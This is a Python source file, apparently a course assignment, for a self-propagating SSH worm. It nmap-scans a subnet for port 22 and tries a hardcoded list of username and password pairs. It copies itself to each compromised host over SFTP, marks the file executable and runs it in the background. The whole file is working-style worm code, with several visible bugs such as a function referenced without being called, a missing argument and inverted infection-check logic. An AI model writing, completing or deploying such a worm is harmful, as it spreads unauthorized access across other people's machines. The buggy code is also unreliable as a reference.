from asyncio.windows_events import NULL
from genericpath import exists
import paramiko
import sys
import socket
import nmap
import netifaces
import os

# The list of credentials to attempt
credList = [
('helo', 'world'),
('root', '#Gig#'),
('kali', 'kali'),
('osboxes', 'osboxes.org'),
('osboxes', 'student'),
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem():
	if exists(INFECTED_MARKER_FILE):
		return True
	return False

#################################################################
# Marks the system as infected
#################################################################
def markInfected():
	open(INFECTED_MARKER_FILE, 'x')

###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):
	
	# The worm will copy itself to the
	# remote system, change its permissions
	# to executable, and execute itself.
	sftpClient = sshClient.open_sftp()
	sftpClient.put('/tmp/worm.py','/tmp/worm.py')
	sshClient.exec_command('chmod 777 /tmp/worm.py')
	sshClient.exec_command("nohup python3 /tmp/worm.py")
	pass


############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, password, sshClient):
	try:
		sshClient.connect(host,username=userName,password=password)
	except paramiko.SSHException:
		return 1
	except socket.error:
		return 3
	return 0

###############################################################
# Wages a dictionary attack against the host
# @param host - the host IP to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.open_sftp().get()
	# The results of an attempt
	attemptResults = None
				
	# Go through the credentials
	for (username, password) in credList:
		if(0==tryCredentials(host, username, password, ssh)):
			victim = (ssh,username,password)
			return victim
			
	# Could not find working credentials
	return NULL	

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The IP address of the current system
####################################################
def getMyIP(interface):
	networkInterfaces = netifaces.interfaces()
	ipAddr = None

	# Go through all the interfaces
	for netFace in networkInterfaces:

		# The IP address of the interface
		addr = netifaces.ifaddresses(netFace)[2][0]['addr']

		# Get the IP address
		if not addr == "127.0.0.1":
			ipAddr = addr
			break

	return ipAddr

#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
	# Create an instance of the port scanner class
	portScanner = nmap.PortScanner()

	# Scan the network for systems whose
	# port 22 is open 
	portScanner.scan('10.20.22.0/25', arguments='-p 22 --open')

	# Scan the network for hosts
	hostInfo = portScanner.all_hosts()

	# The list of hosts that are up.
	liveHosts = []

	# Go trough all the hosts returned by nmap
	# and remove all who are not up and running
	for host in hostInfo:

		# Is ths host up?
		if portScanner[host].state() == "up":
			liveHosts.append(host)

	return liveHosts



# If we are being run without a command line parameters, 
# then we assume we are executing on a victim system and
# will act maliciously. This way, when you initially run the 
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciously
# on attackers system. 
# If you do not like this approach,an alternative approach
# is to hardcode the origin system's IP address and have
# the worm check the IP of the current system against the hardcoded IP. 
if len(sys.argv) < 2: 
	if(isInfectedSystem):
		print("infected")
		sys.exit()
markInfected()

# +TODO: Get the IP of the current system
myIP = getMyIP()

# Get the hosts on the same network
networkHosts = getHostsOnTheSameNetwork()

# +TODO: Remove the IP of the current system
# from the list of discovered systems (we
# do not want to target ourselves!).
networkHosts.remove(myIP)
print("Found hosts: ", networkHosts)

# Go through the network hosts
for host in networkHosts:

	# Try to attack this host
	sshInfo = attackSystem(host)
	print(sshInfo)
	
	# Did the attack succeed?
	if sshInfo:
		print("Trying to spread")
		
		# -TODO: Check if the system was	
		# already infected.(which the worm will place there
		# when it first infects the system)
		#
		# If the system was already infected proceed.
		# Otherwise, infect the system and terminate.
		# Infect that system

		try:
			remotepath = '/tmp/infected.txt'
			localpath  = '/tmp/infected.txt'
			 # Copy the file from the specified
			 # remote path to the specified
		 	 # local path. If the file does exist
			 # at the remote path, then get()
		 	 # will throw IOError exception
		 	 # (that is, we know the system is
		 	 # not yet infected).
		 
			sshInfo[0].open_sftp().get(remotepath, localpath)
			spreadAndExecute(sshInfo[0])
		except IOError:
			print("This system should already be infected")

		
		
		print("Spreading complete")
	